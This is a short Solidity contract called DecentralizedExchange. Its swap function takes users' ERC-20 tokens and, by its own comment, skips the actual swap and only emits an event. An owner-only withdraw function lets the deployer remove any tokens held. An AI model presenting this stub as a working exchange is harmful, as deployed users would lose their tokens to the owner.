pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract DecentralizedExchange {
    address public owner;
    
    event Swapped(address indexed from, address indexed to, uint256 amount);
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }
    
    function swap(address _token, uint256 _amount) external {
        require(_token != address(0), "Invalid token address");
        require(_amount > 0, "Invalid amount");
        
        IERC20 token = IERC20(_token);
        
        // Ensure sufficient allowance
        require(token.allowance(msg.sender, address(this)) >= _amount, "Insufficient allowance");
        
        // Transfer tokens from user to this contract
        require(token.transferFrom(msg.sender, address(this), _amount), "Token transfer failed");
        
        // Swap logic here (e.g., use UniswapV2Router)
        // For simplicity, just emit an event
        emit Swapped(msg.sender, address(this), _amount);
    }
    
    function withdraw(address _token, uint256 _amount) external onlyOwner {
        require(_token != address(0), "Invalid token address");
        require(_amount > 0, "Invalid amount");
        
        IERC20 token = IERC20(_token);
        
        // Transfer tokens from this contract to owner
        require(token.transfer(owner, _amount), "Token transfer failed");
    }
}
